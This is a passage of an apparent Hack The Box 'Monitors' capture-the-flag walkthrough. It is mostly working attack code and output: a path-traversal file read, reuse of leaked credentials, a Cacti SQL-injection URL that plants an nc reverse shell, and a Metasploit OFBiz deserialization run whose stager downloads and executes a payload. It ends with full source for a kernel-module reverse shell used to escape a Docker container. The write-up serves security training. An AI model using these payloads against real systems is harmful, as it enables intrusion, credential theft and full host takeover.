&quot;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/apache2/sites-available/000-default.conf&quot;</span></span><br><span class="line"><span class="comment"># Default virtual host settings</span></span><br><span class="line"><span class="comment"># Add monitors.htb.conf</span></span><br><span class="line"><span class="comment"># Add cacti-admin.monitors.htb.conf</span></span><br><span class="line"></span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">        <span class="comment"># The ServerName directive sets the request scheme, hostname and port that</span></span><br><span class="line">        <span class="comment"># the server uses to identify itself. This is used when creating</span></span><br><span class="line">        <span class="comment"># redirection URLs. In the context of virtual hosts, the ServerName</span></span><br><span class="line">        <span class="comment"># specifies what hostname must appear in the request&#x27;s Host: header to</span></span><br><span class="line">        <span class="comment"># match this virtual host. For the default virtual host (this file) this</span></span><br><span class="line">        <span class="comment"># value is not decisive as it is used as a last resort host regardless.</span></span><br><span class="line">        <span class="comment"># However, you must set it for any further virtual host explicitly.</span></span><br><span class="line">        <span class="comment">#ServerName www.example.com</span></span><br><span class="line"></span><br><span class="line">        ServerAdmin admin@monitors.htb</span><br><span class="line">        DocumentRoot /var/www/html</span><br><span class="line">        Redirect 403 /</span><br><span class="line">        ErrorDocument 403 <span class="string">&quot;Sorry, direct IP access is not allowed. &lt;br&gt;&lt;br&gt;If you are having issues accessing the site then contact the website administrator: admin@monitors.htb&quot;</span></span><br><span class="line">        UseCanonicalName Off</span><br><span class="line">        <span class="comment"># Available loglevels: trace8, ..., trace1, debug, info, notice, warn,</span></span><br><span class="line">        <span class="comment"># error, crit, alert, emerg.</span></span><br><span class="line">        <span class="comment"># It is also possible to configure the loglevel for particular</span></span><br><span class="line">        <span class="comment"># modules, e.g.</span></span><br><span class="line">        <span class="comment">#LogLevel info ssl:warn</span></span><br><span class="line"></span><br><span class="line">        ErrorLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/error.log</span><br><span class="line">        CustomLog <span class="variable">$&#123;APACHE_LOG_DIR&#125;</span>/access.log combined</span><br><span class="line"></span><br><span class="line">        <span class="comment"># For most configuration files from conf-available/, which are</span></span><br><span class="line">        <span class="comment"># enabled or disabled at a global level, it is possible to</span></span><br><span class="line">        <span class="comment"># include a line for only one particular virtual host. For example the</span></span><br><span class="line">        <span class="comment"># following line enables the CGI configuration for this host only</span></span><br><span class="line">        <span class="comment"># after it has been globally disabled with &quot;a2disconf&quot;.</span></span><br><span class="line">        <span class="comment">#Include conf-available/serve-cgi-bin.conf</span></span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span></span><br></pre></td></tr></table></figure>
+
+<p>Found a new vhost called cacti-admin.monitors.htb.</p>
+<p>Let’s add this in &#x2F;etc&#x2F;hosts file.</p>
+<p>Now let’s go to cacti-admin.monitors.htb.</p>
+<p>Got the login page let’s login with wordpress creads which we find in wp-config.php.</p>
+<p>Username : admin<br>Password : BestAdministrator@2020!</p>
+<p>We got login succesfully and we are inside cacti admin panel let’s check the cacti version.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">version : 1.2.12</span><br></pre></td></tr></table></figure>
+
+<p>Let’s check on google for some exploit for that specific version.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cacti 1.2.12 exploit poc</span><br></pre></td></tr></table></figure>
+
+<p>Find a github issue.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NhY3RpL2NhY3RpL2lzc3Vlcy8zNjIy">SQL Injection vulnerability due to input validation failure when editing colors (CVE-2020-14295)<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>There is an sql injection on the latest version (in the &#x2F;cacti&#x2F;color.php page on the parameter filter.</p>
+<p>And the application accept stacked queries, this can easy lead to remote code execution by replacing the path_php_binary setting inside the database.</p>
+<p>Let’s try this to get rev shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cacti-admin.monitors.htb/cacti/color.php?action=<span class="built_in">export</span>&amp;header=<span class="literal">false</span>&amp;filter=1%27)+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+<span class="built_in">set</span>+value=%27rm+/tmp/aa%3bmkfifo+/tmp/aa%3bcat+/tmp/aa|/bin/sh+-i+2%3E%261|nc+10.10.14.3+9001+%3E/tmp/aa;%27+<span class="built_in">where</span>+name=%27path_php_binary%27;--+-</span><br></pre></td></tr></table></figure>
+
+<p>Hit this rev shell and you got a file leave this file and hit the second url.</p>
+<p>Before hit the second url start your netcat listner on 9001.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://cacti-admin.monitors.htb/cacti/host.php?action=reindex</span><br></pre></td></tr></table></figure>
+
+<p>The page is reloading. let’s check the netcat listner.</p>
+<p>Got the reverse shell as www-data.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/monitors]</span><br><span class="line">└─<span class="comment"># nc -lvp 9001</span></span><br><span class="line">Ncat: Version 7.91 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on :::9001</span><br><span class="line">Ncat: Listening on 0.0.0.0:9001</span><br><span class="line">Ncat: Connection from 10.10.10.238.</span><br><span class="line">Ncat: Connection from 10.10.10.238:52046.</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ whoami</span></span><br><span class="line"><span class="string">www-data</span></span><br></pre></td></tr></table></figure>
+
+<p>Now we need marcus user access so i use grep command to searching string “marcus” related file on every directory.</p>
+<p>I found an interesting file called cacti-backup.service.</p>
+<p>It’s point us to &#x2F;home&#x2F;marcus&#x2F;.backup&#x2F;backup.sh and when we cat that file we found the password for marcus.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ grep <span class="string">&#x27;marcus&#x27;</span> /etc -R 2&gt;/dev/null</span><br><span class="line">/etc/group-:marcus:x:1000:</span><br><span class="line">/etc/subgid:marcus:165536:65536</span><br><span class="line">/etc/group:marcus:x:1000:</span><br><span class="line">/etc/passwd:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash</span><br><span class="line">/etc/systemd/system/cacti-backup.service:ExecStart=/home/marcus/.backup/backup.sh</span><br><span class="line">/etc/subuid:marcus:165536:65536</span><br><span class="line">/etc/passwd-:marcus:x:1000:1000:Marcus Haynes:/home/marcus:/bin/bash</span><br><span class="line">$ <span class="built_in">cd</span> /etc/systemd/system/</span><br><span class="line">$ <span class="built_in">cat</span> cacti-backup.service</span><br><span class="line">[Unit]</span><br><span class="line">Description=Cacti Backup Service</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">User=www-data</span><br><span class="line">ExecStart=/home/marcus/.backup/backup.sh</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line">$ <span class="built_in">cat</span> /home/marcus/.backup/backup.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">backup_name=<span class="string">&quot;cacti_backup&quot;</span></span><br><span class="line">config_pass=<span class="string">&quot;VerticalEdge2020&quot;</span></span><br><span class="line"></span><br><span class="line">zip /tmp/<span class="variable">$&#123;backup_name&#125;</span>.zip /usr/share/cacti/cacti/*</span><br><span class="line">sshpass -p <span class="string">&quot;<span class="variable">$&#123;config_pass&#125;</span>&quot;</span> scp /tmp/<span class="variable">$&#123;backup_name&#125;</span> 192.168.1.14:/opt/backup_collection/<span class="variable">$&#123;backup_name&#125;</span>.zip</span><br><span class="line"><span class="built_in">rm</span> /tmp/<span class="variable">$&#123;backup_name&#125;</span>.zip</span><br></pre></td></tr></table></figure>
+
+<p>Let’s login with marcus with ssh and get our user.txt file.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitors:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(marcus) gid=1000(marcus) <span class="built_in">groups</span>=1000(marcus)</span><br><span class="line">marcus@monitors:~$ <span class="built_in">whoami</span></span><br><span class="line">marcus</span><br><span class="line">marcus@monitors:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line">1e3139a8fb55977c78625b57f5c97c4e</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1941.jpg"></li>
+</ul>
+<h3 id="Privilege-escalation"><a href="#Privilege-escalation" class="headerlink" title="Privilege escalation"></a>Privilege escalation</h3><p>let’s check services running on server.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitors:~$ netstat -ant</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State      </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     </span><br><span class="line">tcp        0     36 10.10.10.238:22         10.10.14.3:59860        ESTABLISHED</span><br><span class="line">tcp        0      0 10.10.10.238:52046      10.10.14.3:9001         CLOSE_WAIT </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN     </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN     </span><br><span class="line">tcp6       1      0 10.10.10.238:80         10.10.14.3:34042        CLOSE_WAIT</span><br></pre></td></tr></table></figure>
+
+<p>We find a interesting port called 8443. let’s check on google for this service.</p>
+<p>It’s a https port let’s forward the port becuase it’s running locally we can’t access it directly.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8443:127.0.0.1:8443 marcus@10.10.10.238</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s check on browser what service running on the web.</p>
+<p>It’s running Apache Tomcat&#x2F;9.0.31. let’s check on google for some exploit.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly93d3cucmFwaWQ3LmNvbS9kYi9tb2R1bGVzL2V4cGxvaXQvbGludXgvaHR0cC9hcGFjaGVfb2ZiaXpfZGVzZXJpYWxpemF0aW9uLw==">Apache OFBiz XML-RPC Java Deserialization<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Now let’s run the msfconsole and configure that.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/linux/http/apache_ofbiz_deserialization</span><br><span class="line">[*] Using configured payload linux/x64/meterpreter_reverse_https</span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; <span class="built_in">set</span> rhosts 127.0.0.1</span><br><span class="line">rhosts =&gt; 127.0.0.1</span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; <span class="built_in">set</span> lhost 10.10.14.3</span><br><span class="line">lhost =&gt; 10.10.14.3</span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; <span class="built_in">set</span> lport 9001</span><br><span class="line">lport =&gt; 9001</span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; <span class="built_in">set</span> forceexploit <span class="literal">true</span></span><br><span class="line">forceexploit =&gt; <span class="literal">true</span></span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; <span class="built_in">set</span> payload linux/x64/shell/reverse_tcp</span><br><span class="line">payload =&gt; linux/x64/shell/reverse_tcp</span><br><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(linux/http/apache_ofbiz_deserialization) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.3:9001 </span><br><span class="line">[*] Executing automatic check (<span class="built_in">disable</span> AutoCheck to override)</span><br><span class="line">[!] The target is not exploitable. Target cannot deserialize arbitrary data. ForceExploit is enabled, proceeding with exploitation.</span><br><span class="line">[*] Executing Linux Dropper <span class="keyword">for</span> linux/x64/shell/reverse_tcp</span><br><span class="line">[*] Using URL: http://0.0.0.0:8088/xFKYmWzlLi853C</span><br><span class="line">[*] Local IP: http://192.168.177.128:8088/xFKYmWzlLi853C</span><br><span class="line">[+] Successfully executed <span class="built_in">command</span>: curl -so /tmp/uTbDdZRj http://10.10.14.3:8088/xFKYmWzlLi853C;<span class="built_in">chmod</span> +x /tmp/uTbDdZRj;/tmp/uTbDdZRj;<span class="built_in">rm</span> -f /tmp/uTbDdZRj</span><br><span class="line">[*] Command Stager progress - 100.00% <span class="keyword">done</span> (117/117 bytes)</span><br><span class="line">[*] Client 10.10.10.238 (curl/7.64.0) requested /xFKYmWzlLi853C</span><br><span class="line">[*] Sending payload to 10.10.10.238 (curl/7.64.0)</span><br><span class="line">[*] Sending stage (38 bytes) to 10.10.10.238</span><br><span class="line">[*] Command shell session 1 opened (10.10.14.3:9001 -&gt; 10.10.10.238:60830) at 2021-05-01 04:58:09 -0400</span><br><span class="line">[*] Server stopped.</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/usr/src/apache-ofbiz-17.12.01</span><br></pre></td></tr></table></figure>
+
+<p>We are root but in the docker container.</p>
+<p>Now let’s run linpeas.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1942.jpg"></li>
+</ul>
+<p>Let’s check on google for Abusing capability.</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBlbnRlc3RlcmFjYWRlbXkuY29tL2FidXNpbmctc3lzLW1vZHVsZS1jYXBhYmlsaXR5LXRvLXBlcmZvcm0tZG9ja2VyLWNvbnRhaW5lci1icmVha291dC1jZjVjMjk5NTZlZGQ=">Docker Container Breakout: Abusing SYS_MODULE capability!<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>Checking the capabilities provided to the docker container</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@531ea6f91c39:/usr/src/apache-ofbiz-17.12.01<span class="comment"># capsh --print</span></span><br><span class="line">capsh --<span class="built_in">print</span></span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+eip</span><br><span class="line">Bounding <span class="built_in">set</span> =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span><br><span class="line">Securebits: 00/0x0/1<span class="string">&#x27;b0</span></span><br><span class="line"><span class="string"> secure-noroot: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-no-suid-fixup: no (unlocked)</span></span><br><span class="line"><span class="string"> secure-keep-caps: no (unlocked)</span></span><br><span class="line"><span class="string">uid=0(root)</span></span><br><span class="line"><span class="string">gid=0(root)</span></span><br><span class="line"><span class="string">groups=</span></span><br></pre></td></tr></table></figure>
+
+<p>Let’s check the ip of docker0 interface inside marcus ssh shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitors:~$ ip a</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: ens160: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000</span><br><span class="line">    <span class="built_in">link</span>/ether 00:50:56:b9:67:57 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 10.10.10.238/24 brd 10.10.10.255 scope global ens160</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 dead:beef::250:56ff:feb9:6757/64 scope global dynamic mngtmpaddr </span><br><span class="line">       valid_lft 86280sec preferred_lft 14280sec</span><br><span class="line">    inet6 fe80::250:56ff:feb9:6757/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:27:57:47:01 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 fe80::42:27ff:fe57:4701/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">4: br-968a1c1855aa: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    <span class="built_in">link</span>/ether 02:42:6c:c5:00:44 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-968a1c1855aa</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">6: veth8849a36@if5: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master docker0 state UP group default </span><br><span class="line">    <span class="built_in">link</span>/ether ee:80:6e:96:12:95 brd ff:ff:ff:ff:ff:ff link-netnsid 0</span><br><span class="line">    inet6 fe80::ec80:6eff:fe96:1295/64 scope <span class="built_in">link</span> </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br></pre></td></tr></table></figure>
+
+<p>Now we need to create two files</p>
+<p>1 -&gt; reverse-shell.c</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;linux/kmod.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/module.h&gt;</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;AttackDefense&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;LKM reverse shell module&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;1.0&quot;</span>);</span><br><span class="line">char* argv[] = &#123;<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;bash -i &gt;&amp; /dev/tcp/172.17.0.1/4443 0&gt;&amp;1&quot;</span>, NULL&#125;;</span><br><span class="line">static char* envp[] = &#123;<span class="string">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>, NULL &#125;;</span><br><span class="line">static int __init reverse_shell_init(void) &#123;</span><br><span class="line"><span class="built_in">return</span> call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);</span><br><span class="line">&#125;</span><br><span class="line">static void __exit reverse_shell_exit(void) &#123;</span><br><span class="line">printk(KERN_INFO <span class="string">&quot;Exiting\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(reverse_shell_init);</span><br><span class="line">module_exit(reverse_shell_exit);</span><br></pre></td></tr></table></figure>
+
+<p>2 -&gt; Makefile</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj-m +=reverse-shell.o</span><br><span class="line">all:</span><br><span class="line">	make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) modules</span><br><span class="line">clean:</span><br><span class="line">	make -C /lib/modules/$(shell <span class="built_in">uname</span> -r)/build M=$(PWD) clean</span><br></pre></td></tr></table></figure>
+
+<p>Now in docker root shell on &#x2F;root directory wget the two files inside &#x2F;root directory.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@531ea6f91c39:/root<span class="comment"># wget http://10.10.14.3:88/reverse-shell.c</span></span><br><span class="line">wget http://10.10.14.3:88/reverse-shell.c</span><br><span class="line">--2021-05-01 09:40:30--  http://10.10.14.3:88/reverse-shell.c</span><br><span class="line">Connecting to 10.10.14.3:88... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 616 [text/plain]</span><br><span class="line">Saving to: <span class="string">&#x27;reverse-shell.c&#x27;</span></span><br><span class="line"></span><br><span class="line">reverse-shell.c     100%[===================&gt;]     616  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2021-05-01 09:40:30 (60.4 MB/s) - <span class="string">&#x27;reverse-shell.c&#x27;</span> saved [616/616]</span><br><span class="line"></span><br><span class="line">root@531ea6f91c39:/root<span class="comment"># wget http://10.10.14.3:88/Makefile</span></span><br><span class="line">wget http://10.10.14.3:88/Makefile</span><br><span class="line">--2021-05-01 09:41:04--  http://10.10.14.3:88/Makefile</span><br><span class="line">Connecting to 10.10.14.3:88... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 160 [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;Makefile&#x27;</span></span><br><span class="line"></span><br><span class="line">Makefile            100%[===================&gt;]     160  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2021-05-01 09:41:05 (23.8 MB/s) - <span class="string">&#x27;Makefile&#x27;</span> saved [160/160]</span><br></pre></td></tr></table></figure>
+
+<p>Now export the path and compile the program and you got so many files but we need only reverse-shell.ko</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">root@531ea6f91c39:/root<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Makefile  reverse-shell.c</span><br><span class="line">root@531ea6f91c39:/root<span class="comment"># export PATH=$PATH/usr/lib/gcc/x86_64-linux-gnu/8/</span></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>/usr/lib/gcc/x86_64-linux-gnu/8/</span><br><span class="line">root@531ea6f91c39:/root<span class="comment"># make clean</span></span><br><span class="line">make clean</span><br><span class="line">make -C /lib/modules/4.15.0-142-generic/build M=/root clean</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-headers-4.15.0-142-generic&#x27;</span></span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-headers-4.15.0-142-generic&#x27;</span></span><br><span class="line">root@531ea6f91c39:/root<span class="comment"># make all</span></span><br><span class="line">make all</span><br><span class="line">make -C /lib/modules/4.15.0-142-generic/build M=/root modules</span><br><span class="line">make[1]: Entering directory <span class="string">&#x27;/usr/src/linux-headers-4.15.0-142-generic&#x27;</span></span><br><span class="line">  CC [M]  /root/reverse-shell.o</span><br><span class="line">  Building modules, stage 2.</span><br><span class="line">  MODPOST 1 modules</span><br><span class="line">  CC      /root/reverse-shell.mod.o</span><br><span class="line">  LD [M]  /root/reverse-shell.ko</span><br><span class="line">make[1]: Leaving directory <span class="string">&#x27;/usr/src/linux-headers-4.15.0-142-generic&#x27;</span></span><br><span class="line">root@531ea6f91c39:/root<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">Makefile        modules.order    reverse-shell.ko     reverse-shell.mod.o</span><br><span class="line">Module.symvers  reverse-shell.c  reverse-shell.mod.c  reverse-shell.o</span><br></pre></td></tr></table></figure>
+
+<p>Before insert the kernel module start your netcat listner on marcus ssh shell.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">marcus@monitors:~$ nc -lnvp 4443</span><br><span class="line">Listening on [0.0.0.0] (family 0, port 4443)</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s insert the kernel module using insmod.</p>
